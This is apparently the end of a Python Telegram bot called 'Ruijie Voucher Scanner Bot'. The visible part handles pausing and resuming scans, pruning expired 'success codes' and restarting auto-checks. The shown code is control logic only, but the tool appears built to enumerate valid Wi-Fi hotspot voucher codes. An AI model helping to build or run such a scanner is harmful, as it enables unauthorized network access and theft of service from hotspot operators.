    uid  = call.from_user.id
    sess = get_session(uid)
    state = sess.state or ""
    if state.startswith("expired:"):
        expired = state[len("expired:"):].split(",")
        u = db.get_user(uid)
        u["success_codes"] = [
            e for e in u["success_codes"]
            if (e["code"] if isinstance(e, dict) else e) not in expired
        ]
        db.mark_dirty()
        db._save_now()
        sess.state = None
        await bot.answer_callback_query(call.id, f"Removed {len(expired)} expired codes.", show_alert=True)
        await bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=None,
        )
    else:
        await bot.answer_callback_query(call.id, "Nothing to remove.")


@bot.callback_query_handler(func=lambda c: c.data == "pause_scan")
async def cb_pause_scan(call):
    uid  = call.from_user.id
    sess = get_session(uid)
    if sess.is_running() and not sess.is_paused():
        sess.stats["pause_start"] = time.time()
        sess.pause_event.set()
        await bot.answer_callback_query(call.id, "⏸ Paused")
    else:
        await bot.answer_callback_query(call.id, "Not running or already paused.")


@bot.callback_query_handler(func=lambda c: c.data == "resume_scan")
async def cb_resume_scan(call):
    uid  = call.from_user.id
    sess = get_session(uid)
    if sess.is_running() and sess.is_paused():
        paused_dur = time.time() - sess.stats.get("pause_start", time.time())
        sess.stats["paused_secs"] = sess.stats.get("paused_secs", 0) + paused_dur
        sess.pause_event.clear()
        await bot.answer_callback_query(call.id, "▶️ Resumed")
    else:
        await bot.answer_callback_query(call.id, "Not paused.")


# ─────────────────────────── MAIN ─────────────────────────────────────────────
async def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_TOKEN_HERE":
        print("[!] Set BOT_TOKEN environment variable first.")
        sys.exit(1)
    print("[*] Ruijie Voucher Scanner Bot starting…")
    print(f"[*] Workers per user : {WORKERS_PER_USER}")
    print(f"[*] Session refresh  : every {PER_SESSION_MAX} requests")
    asyncio.create_task(db.periodic_save())
    # Resume auto-check for users who had it enabled
    for uid_str, udata in db.data.get("users", {}).items():
        if udata.get("settings", {}).get("auto_check"):
            start_auto_check(int(uid_str))
            print(f"[*] Auto-check resumed for user {uid_str}")
    await bot.polling(non_stop=True, request_timeout=60)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Bot stopped.")
        db._save_now()
        sys.exit(0)
